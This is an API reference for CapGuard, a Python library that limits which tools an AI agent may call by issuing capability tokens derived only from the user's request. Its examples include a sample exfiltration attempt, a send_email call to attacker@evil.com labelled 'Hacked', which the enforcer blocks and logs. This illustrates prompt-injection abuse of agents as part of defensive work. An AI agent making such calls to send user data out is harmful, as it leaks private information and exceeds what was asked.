# API Reference

This document provides a complete reference for all CapGuard modules.

---

## Module: `capguard.models`

Core data structures used throughout CapGuard.

### `CapabilityToken`

**The core security primitive** - specifies which tools an agent can use.

```python
from capguard.models import CapabilityToken

token = CapabilityToken(
    user_request="Summarize http://example.com",
    granted_tools={
        "read_website": True,
        "send_email": False,
        "search_emails": False
    },
    confidence=0.95,
    classification_method="llm-llama3"
)
```

**Fields:**
- `request_id: str` - Unique ID (auto-generated UUID)
- `user_request: str` - Original user request
- `granted_tools: Dict[str, bool]` - Which tools are granted
- `constraints: Dict[str, Dict[str, Any]]` - Tool-specific constraints (e.g., email whitelist)
- `timestamp: datetime` - When token was created
- `confidence: float` - Classifier confidence (0.0-1.0)
- `classification_method: str` - Which classifier was used

**Security Property:**  
Generated ONLY from user request - never sees external data. This prevents prompt injection.

---

### `ToolDefinition`

Metadata about a tool.

```python
from capguard.models import ToolDefinition, ToolParameter

tool = ToolDefinition(
    name="send_email",
    description="Send an email message",
    parameters=[
        ToolParameter(name="to", type="str", description="Recipient", required=True),
        ToolParameter(name="subject", type="str", description="Subject", required=True),
        ToolParameter(name="body", type="str", description="Body", required=True)
    ],
    risk_level=4,  # 1=safe, 5=critical
    requires_confirmation=True
)
```

**Fields:**
- `name: str` - Unique tool identifier
- `description: str` - What the tool does (used by classifiers)
- `parameters: List[ToolParameter]` - Tool parameters
- `risk_level: int` - Risk rating (1-5)
  - 1: Safe (read-only, no side effects)
  - 2: Low risk (local reads)
  - 3: Medium (modifies state locally)
  - 4: High (external communication)
  - 5: Critical (irreversible, destructive)
- `requires_confirmation: bool` - Should user confirm before execution?

---

### `AuditLogEntry`

Audit record for tool execution attempts.

```python
from capguard.models import AuditLogEntry

entry = AuditLogEntry(
    request_id="abc-123",
    tool_name="send_email",
    action="blocked",  # "granted" | "blocked" | "executed" | "failed"
    capability_token=token,
    parameters={"to": "attacker@evil.com"},
    potential_attack=True
)
```

**Fields:**
- `timestamp: datetime` - When attempt occurred
- `request_id: str` - Links to CapabilityToken
- `tool_name: str` - Which tool was attempted
- `action: str` - What happened (granted/blocked/executed/failed)
- `capability_token: CapabilityToken` - The token used
- `parameters: Dict[str, Any]` - Tool parameters
- `result: Optional[str]` - Execution result (if successful)
- `error: Optional[str]` - Error message (if failed)
- `potential_attack: bool` - Flag for security review

---

## Module: `capguard.core`

Core security enforcement components.

### `ToolRegistry`

Central registry for all available tools.

```python
from capguard import ToolRegistry, create_tool_definition

registry = ToolRegistry()

# Register a tool
registry.register(
    create_tool_definition(
        name="read_website",
        description="Fetch and read content from a URL",
        risk_level=2,
        parameters=[
            {"name": "url", "type": "str", "description": "URL to fetch", "required": True}
        ]
    ),
    func=read_website_implementation
)

# Query registry
tools = registry.list_tools()  # ["read_website"]
definition = registry.get_definition("read_website")
```

**Methods:**
- `register(definition, func, overwrite=False)` - Register new tool
- `get_tool(name)` - Get tool implementation
- `get_definition(name)` - Get tool metadata
- `list_tools()` - List all tool names
- `get_all_definitions()` - Get all tool metadata (for classifiers)
- `unregister(name)` - Remove a tool

---

### `IntentClassifier` (ABC)

Abstract base for all classifiers.

```python
from capguard.core import IntentClassifier
from capguard.models import CapabilityToken

class MyClassifier(IntentClassifier):
    def classify(self, user_request: str) -> CapabilityToken:
        # Analyze request, return token
        pass
```

**Methods:**
- `classify(user_request: str) -> CapabilityToken` - **MUST IMPLEMENT**
- `get_available_tools() -> List[str]` - List available tools

**Security Guarantee:**  
`classify()` receives ONLY the user request - never external data.

---

### `CapabilityEnforcer`

Enforces capability tokens at runtime.

```python
from capguard import CapabilityEnforcer

enforcer = CapabilityEnforcer(registry)

# Attempt to execute tool
try:
    result = enforcer.execute_tool(
        "read_website",
        capability_token=token,
        url="http://example.com"
    )
except PermissionDeniedError:
    print("Tool not granted!")
```

**Methods:**
- `execute_tool(tool_name, capability_token, **kwargs)` - Execute if granted
- `get_audit_log()` - Get all audit entries
- `get_blocked_attempts()` - Get only blocked attempts
- `clear_audit_log()` - Clear audit log

**Behavior:**
1. Checks if tool is granted in token
2. Validates constraints
3. Executes tool if allowed
4. Logs everything (success/failure/blocked)
5. Raises `PermissionDeniedError` if blocked

---

## Module: `capguard.classifiers`

Implementations of intent classifiers.

### `RuleBasedClassifier`

Simple keyword-based classifier.

```python
from capguard.classifiers import RuleBasedClassifier, create_default_rules

classifier = RuleBasedClassifier(
    tool_registry=registry,
    rules={
        "summarize": ["read_website"],
        "email": ["read_website", "send_email"],
        "search email": ["search_emails"]
    }
)

# Or use defaults
classifier = RuleBasedClassifier(registry, create_default_rules())

token = classifier.classify("Summarize this URL")
```

**Pros:**
- ⚡ Instant (0ms)
- 💰 Free
- 🔧 Deterministic
- ✅ Good for 70-80% of common cases

**Cons:**
- ❌ Limited flexibility
- ❌ Can't handle complex/ambiguous requests

---

### `LLMClassifier`

LLM-based classifier (OpenAI-compatible APIs).

```python
from capguard.classifiers import LLMClassifier

# Ollama (local)
classifier = LLMClassifier(
    tool_registry=registry,
    base_url="http://localhost:11434/v1",
    model="llama3",
    api_key="ollama"
)

# OpenAI
classifier = LLMClassifier(
    tool_registry=registry,
    model="gpt-4o-mini",
    api_key=os.getenv("OPENAI_API_KEY")
)

token = classifier.classify("Email me a summary of this article")
```

**Parameters:**
- `tool_registry: ToolRegistry` - Available tools
- `model: str` - Model name (e.g., "llama3", "gpt-4o-mini")
- `base_url: Optional[str]` - API endpoint (None for OpenAI, custom for Ollama)
- `api_key: str` - API key
- `temperature: float` - LLM temperature (default: 0.0)
- `max_tokens: int` - Max response tokens (default: 500)

**Pros:**
- ✅ Understands natural language
- ✅ Handles complex/ambiguous requests
- ✅ Provider-agnostic (Ollama, OpenAI, Anthropic)

**Cons:**
- ⏱️ Slower (100-500ms)
- 💰 Costs money (unless using Ollama)

---

## Module: `capguard.prompts`

System prompts for LLM operations.

### `CLASSIFICATION_SYSTEM_PROMPT`

System prompt for LLM classifier.

```python
from capguard.prompts import CLASSIFICATION_SYSTEM_PROMPT

print(CLASSIFICATION_SYSTEM_PROMPT)
# "You are a security-focused intent classifier..."
```

### `CLASSIFICATION_USER_PROMPT_TEMPLATE`

User prompt template (formatted with tools + request).

```python
from capguard.prompts import CLASSIFICATION_USER_PROMPT_TEMPLATE

prompt = CLASSIFICATION_USER_PROMPT_TEMPLATE.format(
    tools_description="...",
    user_request="Summarize URL"
)
```

---

## Helper Functions

### `create_tool_definition()`

Convenience function to create ToolDefinition.

```python
from capguard import create_tool_definition

definition = create_tool_definition(
    name="send_email",
    description="Send an email",
    risk_level=4,
    parameters=[
        {"name": "to", "type": "str", "description": "Recipient", "required": True}
    ],
    requires_confirmation=True
)
```

---

## Exceptions

All exceptions inherit from `CapGuardError`.

```python
from capguard import (
    CapGuardError,           # Base exception
    PermissionDeniedError,   # Tool not granted
    ConstraintViolationError, # Constraint violated
    ToolNotFoundError,       # Tool doesn't exist
    ToolAlreadyRegisteredError,  # Tool already exists
    ClassificationError      # Classification failed
)
```

---

## Complete Example

```python
from capguard import (
    ToolRegistry,
    create_tool_definition,
    CapabilityEnforcer,
    PermissionDeniedError
)
from capguard.classifiers import LLMClassifier

# 1. Setup tools
registry = ToolRegistry()
registry.register(
    create_tool_definition("read_website", "Fetch URL", 2,
        [{"name": "url", "type": "str", "description": "URL", "required": True}]
    ),
    lambda url: f"Content from {url}"
)
registry.register(
    create_tool_definition("send_email", "Send email", 4,
        [{"name": "to", "type": "str", "description": "Recipient", "required": True}]
    ),
    lambda to, subject, body: f"Sent to {to}"
)

# 2. Create classifier (Ollama)
classifier = LLMClassifier(
    registry,
    base_url="http://localhost:11434/v1",
    model="llama3",
    api_key="ollama"
)

# 3. Create enforcer
enforcer = CapabilityEnforcer(registry)

# 4. Classify user request
user_request = "Summarize http://example.com"
token = classifier.classify(user_request)

print(f"Granted: {token.granted_tools}")
# {'read_website': True, 'send_email': False}

# 5. Execute allowed tools
result = enforcer.execute_tool("read_website", token, url="http://example.com")
print(result)  # Works!

# 6. Try blocked tool
try:
    enforcer.execute_tool("send_email", token, to="attacker@evil.com",
                          subject="Hacked", body="Data")
except PermissionDeniedError as e:
    print(f"Attack blocked: {e}")

# 7. Review audit log
for entry in enforcer.get_blocked_attempts():
    print(f"Blocked: {entry.tool_name} with {entry.parameters}")
```

---

## Next Steps

- **LangChain Integration:** See `docs/LANGCHAIN_INTEGRATION.md`
- **Docker Setup:** See `docs/DOCKER_OLLAMA_GUIDE.md`
- **Architecture:** See `docs/ARCHITECTURE_DESIGN.md`
